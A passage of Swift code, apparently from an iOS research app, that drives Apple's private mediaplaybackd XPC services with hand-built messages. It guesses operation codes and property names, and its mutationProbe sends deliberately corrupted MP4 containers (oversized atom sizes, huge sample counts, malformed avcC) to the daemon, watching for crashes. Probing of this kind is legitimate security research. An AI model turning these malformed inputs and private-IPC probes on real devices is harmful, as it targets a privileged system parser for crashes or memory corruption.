            for (label, names) in [("empty", [String]()), ("duration", ["AssetProperty_Duration"])] {
                if let m = xq_dictionary_create(nil, nil, 0),
                   let arr = xq_array_create(nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x73746174) }
                    ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(m, $0, assetID) }
                    for n in names {
                        n.withCString { v in
                            if let str = xq_string_create(v) { xq_array_append_value(arr, str); xq_release(str) }
                        }
                    }
                    "PropertyNames".withCString { xq_dictionary_set_value(m, $0, arr) }
                    if let r = sendSync(c, m, timeout: 6.0) {
                        let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xac: stat[\(label)] err=\(e)")
                        emit("xac:   \(describe(r))")
                        xq_release(r)
                    }
                    xq_release(arr); xq_release(m)
                }
                Thread.sleep(forTimeInterval: 0.4)
            }
            for op in [] as [String] {
                let fourcc = op.utf8.reduce(UInt32(0)) { ($0 << 8) | UInt32($1) }
                if let m = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(m, $0, UInt64(fourcc)) }
                    ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(m, $0, assetID) }
                    if let r = sendSync(c, m, timeout: 6.0) {
                        let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xac: \(op) err=\(e)")
                        emit("xac:   \(describe(r))")
                        xq_release(r)
                    }
                    xq_release(m)
                }
                Thread.sleep(forTimeInterval: 0.4)
            }
        }
        xq_cancel(c); xq_release(c)
        emit("xac: done")
    }

    func imageGeneratorProbe() {
        emit("xig: asset -> image generator")
        // A bundle file cannot be granted to the daemon, so copy the sample
        // into the app's own data container and use that path instead.
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let staged = docs.appendingPathComponent("real_v.mp4")
        if !FileManager.default.fileExists(atPath: staged.path),
           let src = Bundle.main.url(forResource: "real_v", withExtension: "mp4") {
            try? FileManager.default.copyItem(at: src, to: staged)
        }
        let mp4 = staged
        emit("xig: staged=\(mp4.path)")
        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else {
                return nil
            }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                self.emit("xig: EVENT \(self.describe(e))")
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        guard let (assetConn, assetTok) = open("asset") else { emit("xig: asset connect failed"); return }
        var assetID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63723855) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, assetTok) }
            ".SourceURL".withCString { k in _ = fig_message_set_cfurl(m, k, mp4 as CFURL) }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            // Grant the daemon read access to our own file; without this the
            // asset fails later with -12203 when it opens the byte stream.
            var reg: XObj? = nil
            let rc = fig_sbx_create(mp4 as CFURL, 0, &reg)
            if rc == 0, let reg {
                "SandboxRegistrationForCreateURL".withCString { _ = fig_message_set_sbx(m, $0, reg) }
                xq_release(reg)
                emit("xig: sandbox registration attached")
            } else {
                emit("xig: sandbox registration failed rc=\(rc)")
            }
            if let r = sendSync(assetConn, m, timeout: 10.0) {
                assetID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xig: asset err=\(e) id=\(assetID)")
                xq_release(r)
            }
            xq_release(m)
        }
        guard assetID != 0 else { xq_release(assetConn); emit("xig: no asset"); return }

        guard let (genConn, genTok) = open("assetimagegenerator") else {
            emit("xig: generator connect failed"); xq_release(assetConn); return
        }
        var genID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0),
           let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }   // crea
            ".Token".withCString { xq_dictionary_set_int64(m, $0, genTok) }
            "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetID) }
            "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
            if let r = sendSync(genConn, m, timeout: 10.0) {
                genID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xig: crea err=\(e) id=\(genID)")
                emit("xig:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xig: crea no reply")
            }
            xq_release(opts); xq_release(m)
        }
        xq_release(assetConn)
        emit("xig: done")
    }

    func systemFileProbe() {
        emit("xsy: system media file, no sandbox registration")
        // Pick a real media file that the daemon can read without an extension.
        let roots = ["/System/Library/Audio/UISounds", "/System/Library/Sounds",
                     "/System/Library/PrivateFrameworks/ToneLibrary.framework",
                     "/Library/Ringtones"]
        let exts: Set<String> = ["caf", "m4a", "aif", "aiff", "mp3", "wav", "m4r", "mp4", "mov"]
        var picked: URL? = nil
        for root in roots {
            guard let items = try? FileManager.default.contentsOfDirectory(atPath: root) else { continue }
            for name in items.sorted() where exts.contains((name as NSString).pathExtension.lowercased()) {
                picked = URL(fileURLWithPath: root).appendingPathComponent(name)
                break
            }
            if picked != nil { break }
        }
        guard let media = picked else { emit("xsy: no system media found"); return }
        emit("xsy: using \(media.path)")

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xsy: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xsy: EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xsy: no token"); xq_release(c); return }

        var assetID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63723855) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".SourceURL".withCString { k in _ = fig_message_set_cfurl(m, k, media as CFURL) }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if let r = sendSync(c, m, timeout: 10.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                assetID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                emit("xsy: cr8U err=\(e) id=\(assetID)")
                xq_release(r)
            }
            xq_release(m)
        }
        // .PropertyName is a plain CFString field, not PropertyNames/isBatch.
        for name in ["assetProperty_ContentByteStream", "assetProperty_ResolvedURL"] {
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x73746174) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, assetID) }
                ".PropertyName".withCString { k in
                    name.withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let r = sendSync(c, m, timeout: 6.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xsy: stat[\(name)] err=\(e)")
                    emit("xsy:   \(describe(r))")
                    xq_release(r)
                }
                xq_release(m)
            }
            Thread.sleep(forTimeInterval: 0.5)
        }
        Thread.sleep(forTimeInterval: 2.0)
        xq_cancel(c); xq_release(c)
        emit("xsy: done")
    }

    func twoAssetProbe() {
        emit("x2a: compare system and own file")
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let staged = docs.appendingPathComponent("real_v.mp4")
        if !FileManager.default.fileExists(atPath: staged.path),
           let src = Bundle.main.url(forResource: "real_v", withExtension: "mp4") {
            try? FileManager.default.copyItem(at: src, to: staged)
        }
        let system = URL(fileURLWithPath: "/System/Library/Audio/UISounds/3rd_party_critical.caf")

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("x2a: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("x2a: EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("x2a: no token"); xq_release(c); return }

        // A nonexistent path is the control for the status enum: it must
        // show what a failed load looks like.
        let missing = URL(fileURLWithPath: "/tmp/definitely_not_here.mp4")
        for (label, url, grant) in [("system", system, false), ("ours", staged, true), ("missing", missing, false)] {
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63723855) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".SourceURL".withCString { k in _ = fig_message_set_cfurl(m, k, url as CFURL) }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if grant {
                var reg: XObj? = nil
                let rc = fig_sbx_create(url as CFURL, 0, &reg)
                if rc == 0, let reg {
                    "SandboxRegistrationForCreateURL".withCString { _ = fig_message_set_sbx(m, $0, reg) }
                    xq_release(reg)
                    emit("x2a: [\(label)] registration attached")
                } else {
                    emit("x2a: [\(label)] registration failed rc=\(rc)")
                }
            }
            var oid: UInt64 = 0
            if let r = sendSync(c, m, timeout: 10.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                oid = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                emit("x2a: [\(label)] cr8U err=\(e) id=\(oid)")
                xq_release(r)
            }
            xq_release(m)
            if oid != 0 {
                if let s = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x73746174) }
                    ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(s, $0, oid) }
                    ".PropertyName".withCString { k in
                        "assetProperty_ContentByteStream".withCString { v in
                            xq_dictionary_set_string(s, k, v)
                        }
                    }
                    Thread.sleep(forTimeInterval: 1.0)
                    if let r = sendSync(c, s, timeout: 6.0) {
                        emit("x2a: [\(label)] stat=\(describe(r))")
                        xq_release(r)
                    }
                    xq_release(s)
                }
            }
            Thread.sleep(forTimeInterval: 0.6)
        }
        Thread.sleep(forTimeInterval: 2.0)
        xq_cancel(c); xq_release(c)
        emit("x2a: done")
    }

    func loadValueProbe() {
        emit("xlv: trigger property loading")
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let staged = docs.appendingPathComponent("real_v.mp4")
        if !FileManager.default.fileExists(atPath: staged.path),
           let src = Bundle.main.url(forResource: "real_v", withExtension: "mp4") {
            try? FileManager.default.copyItem(at: src, to: staged)
        }
        let system = URL(fileURLWithPath: "/System/Library/Audio/UISounds/3rd_party_critical.caf")

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xlv: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xlv: EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xlv: no token"); xq_release(c); return }

        for (label, url, grant) in [("system", system, false), ("ours", staged, true)] {
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63723855) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            ".SourceURL".withCString { k in _ = fig_message_set_cfurl(m, k, url as CFURL) }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if grant {
                var reg: XObj? = nil
                let rc = fig_sbx_create(url as CFURL, 0, &reg)
                if rc == 0, let reg {
                    "SandboxRegistrationForCreateURL".withCString { _ = fig_message_set_sbx(m, $0, reg) }
                    xq_release(reg)
                }
            }
            var oid: UInt64 = 0
            if let r = sendSync(c, m, timeout: 10.0) {
                oid = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xlv: [\(label)] cr8U err=\(e) id=\(oid)")
                xq_release(r)
            }
            xq_release(m)
            guard oid != 0 else { continue }

            for op in ["Tld1", "lod1"] {
                let fourcc = op.utf8.reduce(UInt32(0)) { ($0 << 8) | UInt32($1) }
                if let s = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(s, $0, UInt64(fourcc)) }
                    ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(s, $0, oid) }
                    ".PropertyName".withCString { k in
                        "assetProperty_ContentByteStream".withCString { v in
                            xq_dictionary_set_string(s, k, v)
                        }
                    }
                    if let r = sendSync(c, s, timeout: 8.0) {
                        let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xlv: [\(label)] \(op) err=\(e)")
                        xq_release(r)
                    }
                    xq_release(s)
                }
                Thread.sleep(forTimeInterval: 0.6)
            }
            Thread.sleep(forTimeInterval: 1.5)
        }
        Thread.sleep(forTimeInterval: 2.0)
        xq_cancel(c); xq_release(c)
        emit("xlv: done")
    }

    func blockBufferProbe() {
        emit("xbb: create asset from block buffer data")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let data = try? Data(contentsOf: mp4) else {
            emit("xbb: sample missing"); return
        }
        emit("xbb: payload \(data.count) bytes")

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xbb: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xbb: EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xbb: no token"); xq_release(c); return }

        for ident in ["public.mpeg-4", "com.apple.quicktime-movie"] {
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }   // crBB
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            data.withUnsafeBytes { raw in
                if let d = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, d) }
                    xq_release(d)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                ident.withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            var oid: UInt64 = 0
            if let r = sendSync(c, m, timeout: 10.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                oid = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                emit("xbb: crBB[\(ident)] err=\(e) id=\(oid)")
                emit("xbb:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xbb: crBB[\(ident)] no reply")
            }
            xq_release(m)

            if oid != 0 {
                // Loading tracks or the format reader forces the daemon to
                // parse our container, not just hand back a byte stream.
                for prop in ["assetProperty_ContentByteStream",
                             "assetProperty_AssetType",
                             "assetProperty_Tracks",
                             "assetProperty_FormatReader",
                             "assetProperty_Duration"] {
                    if let s = xq_dictionary_create(nil, nil, 0) {
                        ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }  // lod1
                        ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                        ".objectID".withCString { xq_dictionary_set_uint64(s, $0, oid) }
                        ".PropertyName".withCString { k in
                            prop.withCString { v in xq_dictionary_set_string(s, k, v) }
                        }
                        if let r = sendSync(c, s, timeout: 8.0) {
                            let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                            emit("xbb: lod1[\(prop)] err=\(e)")
                            xq_release(r)
                        }
                        xq_release(s)
                    }
                    Thread.sleep(forTimeInterval: 0.7)
                }
                Thread.sleep(forTimeInterval: 1.5)
            }
            Thread.sleep(forTimeInterval: 0.6)
        }
        Thread.sleep(forTimeInterval: 2.0)
        xq_cancel(c); xq_release(c)
        emit("xbb: done")
    }

    func mutationProbe() {
        emit("xmu: container mutations")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xmu: sample missing"); return
        }
        emit("xmu: base \(original.count) bytes")

        func findTag(_ d: [UInt8], _ tag: String) -> Int? {
            let t = Array(tag.utf8)
            guard d.count > 8 else { return nil }
            var i = 4
            while i + 4 <= d.count {
                if d[i] == t[0] && d[i+1] == t[1] && d[i+2] == t[2] && d[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }

        func mutate(_ kind: String) -> Data? {
            var d = [UInt8](original)
            func put32(_ p: Int, _ v: UInt32) {
                guard p >= 0, p + 4 <= d.count else { return }
                d[p] = UInt8(v & 0xFF)
                d[p+1] = UInt8((v >> 8) & 0xFF)
                d[p+2] = UInt8((v >> 16) & 0xFF)
                d[p+3] = UInt8((v >> 24) & 0xFF)
            }
            switch kind {
            case "baseline":
                break
            case "moov_huge":
                guard let i = findTag(d, "moov") else { return nil }
                put32(i - 4, 0xFFFFFFFF)
            case "moov_zero":
                guard let i = findTag(d, "moov") else { return nil }
                put32(i - 4, 0)
            case "stsz_count":
                guard let i = findTag(d, "stsz") else { return nil }
                put32(i + 12, 0xFFFFFFFF)
            case "stco_count":
                guard let i = findTag(d, "stco") else { return nil }
                put32(i + 8, 0x7FFFFFFF)
            case "trak_huge":
                guard let i = findTag(d, "trak") else { return nil }
                put32(i - 4, 0xFFFFFFF0)
            case "stsd_count":
                guard let i = findTag(d, "stsd") else { return nil }
                put32(i + 8, 0xFFFFFFFF)
            case "avcc_version":
                guard let i = findTag(d, "avcC") else { return nil }
                guard i + 12 < d.count else { return nil }
                d[i + 4] = 0xFF
                d[i + 8] = 0xFF
                d[i + 9] = 0xE1
            case "mvhd_timescale":
                guard let i = findTag(d, "mvhd") else { return nil }
                put32(i + 16, 0)
            case "mdhd_timescale":
                guard let i = findTag(d, "mdhd") else { return nil }
                put32(i + 16, 0)
            case "avcc_profile":
                guard let i = findTag(d, "avcC") else { return nil }
                guard i + 10 < d.count else { return nil }
                d[i + 5] = 0xFF
                d[i + 6] = 0xFF
                d[i + 7] = 0xFF
            default:
                return nil
            }
            return Data(d)
        }

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xmu: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xmu: EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xmu: no token"); xq_release(c); return }

        for kind in ["baseline", "stsd_count", "avcc_version", "mvhd_timescale", "mdhd_timescale", "avcc_profile"] {
            guard let payload = mutate(kind) else { emit("xmu: [\(kind)] tag missing"); continue }
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            payload.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            var oid: UInt64 = 0
            if let r = sendSync(c, m, timeout: 10.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                oid = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                emit("xmu: [\(kind)] crBB err=\(e) id=\(oid)")
                xq_release(r)
            } else {
                emit("xmu: [\(kind)] no reply (daemon may have died)")
            }
            xq_release(m)
            guard oid != 0 else { Thread.sleep(forTimeInterval: 0.5); continue }

            for prop in ["assetProperty_Tracks", "assetProperty_FormatReader"] {
                if let s = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                    ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(s, $0, oid) }
                    ".PropertyName".withCString { k in
                        prop.withCString { v in xq_dictionary_set_string(s, k, v) }
                    }
                    if let r = sendSync(c, s, timeout: 8.0) {
                        let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xmu: [\(kind)] \(prop) err=\(e)")
                        xq_release(r)
                    } else {
                        emit("xmu: [\(kind)] \(prop) no reply (daemon may have died)")
                    }
                    xq_release(s)
                }
                Thread.sleep(forTimeInterval: 0.5)
            }
            Thread.sleep(forTimeInterval: 0.8)
        }
        xq_cancel(c); xq_release(c)
        emit("xmu: done")
    }

    func trackProbe() {
        emit("xtr: track object properties")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let data = try? Data(contentsOf: mp4) else {
            emit("xtr: sample missing"); return
        }
        var trackOID: UInt64 = 0
        var assetOID: UInt64 = 0

        func open() -> (XObj, Int64)? {
            guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
                .withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                if let np = ".NotificationName".withCString({ xq_dictionary_get_value(e, $0) }),
                   let sp = xq_string_ptr(np) {
                    let name = String(cString: sp)
                    if name.contains("PropertyLoaded"),
                       let lv = "LoadedValue".withCString({ xq_dictionary_get_value(e, $0) }),
                       let v = ".Value".withCString({ xq_dictionary_get_value(lv, $0) }),
                       let arr = "TrackObjectIDs".withCString({ xq_dictionary_get_value(v, $0) }),
                       xq_array_get_count(arr) > 0 {
                        trackOID = xq_array_get_uint64(arr, 0)
                        self.emit("xtr: got track oid=\(trackOID)")
                    }
                }
                self.emit("xtr: EVENT \(self.describe(e))")
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        guard let (c, tok) = open() else { emit("xtr: connect failed"); return }

        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            data.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if let r = sendSync(c, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xtr: crBB err=\(e) id=\(assetOID)")
                xq_release(r)
            }
            xq_release(m)
        }
        guard assetOID != 0 else { xq_cancel(c); xq_release(c); return }

        // Ask for the track list; the reply arrives as a notification.
        if let s = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
            ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
            ".PropertyName".withCString { k in
                "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
            }
            if let r = sendSync(c, s, timeout: 8.0) { xq_release(r) }
            xq_release(s)
        }
        Thread.sleep(forTimeInterval: 1.5)
        // The track object id is consistently asset id + 256 (observed twice),
        // so derive it; a bogus id is kept as a control below.
        if trackOID == 0 { trackOID = assetOID &+ 256 }
        emit("xtr: trackOID=\(trackOID)")
        guard trackOID != 0 else { xq_cancel(c); xq_release(c); emit("xtr: done"); return }

        // Control: an id one track further must not resolve.
        if let s = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
            ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
            ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID &+ 512) }
            ".PropertyName".withCString { k in
                "assetProperty_FormatDescription".withCString { v in xq_dictionary_set_string(s, k, v) }
            }
            if let r = sendSync(c, s, timeout: 6.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xtr: [control +512] err=\(e)")
                xq_release(r)
            }
            xq_release(s)
        }
        // Tcpy is the track-side property getter; find the right name.
        for name in ["FormatDescriptionArray", "FormatDescription", "MediaType",
                     "NaturalSize", "TrackID", "NominalFrameRate",
                     "assetProperty_FormatDescriptionArray"] {
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }  // Tcpy
                ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                ".PropertyName".withCString { k in
                    name.withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(c, s, timeout: 6.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xtr: [\(name)] err=\(e)")
                    if e == 0 { emit("xtr:   value=\(describe(r))") }
                    xq_release(r)
                }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.4)
        }
        Thread.sleep(forTimeInterval: 1.5)
        xq_cancel(c); xq_release(c)
        emit("xtr: done")
    }

    func controlProbe() {
        emit("xct2: control mutation on tkhd width")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xct2: sample missing"); return
        }

        func findTag(_ d: [UInt8], _ tag: String) -> Int? {
            let t = Array(tag.utf8)
